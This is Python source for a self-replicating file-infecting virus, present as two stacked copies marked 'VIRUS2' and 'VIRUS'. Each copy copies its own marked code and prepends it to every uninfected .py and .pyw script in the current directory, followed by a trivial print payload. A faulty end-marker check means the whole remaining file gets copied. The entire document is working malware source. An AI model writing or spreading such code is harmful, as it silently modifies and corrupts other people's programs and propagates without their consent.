### VIRUS2 START ###

import sys, glob

virus_name = '### VIRUS2 START ###\n'
code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
print(lines)
virus_area = False
for line in lines:
    if line == virus_name:
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### VIRUS END\n':
        break

python_scripts =glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()
    infected = False
    for line in script_code:
        if line == virus_name:
            infected = True
            break
    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)
# Malicious Code

for i in range(100):
    print('wake up')


### VIRUS END ###
### VIRUS START ###

import sys, glob

code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '### VIRUS START ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### VIRUS END\n':
        break

python_scripts =glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()
    infected = False
    for line in script_code:
        if line == '### VIRUS START ###\n':
            infected = True
            break
    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)
# Malicious Code

print('jesus')


### VIRUS END ###






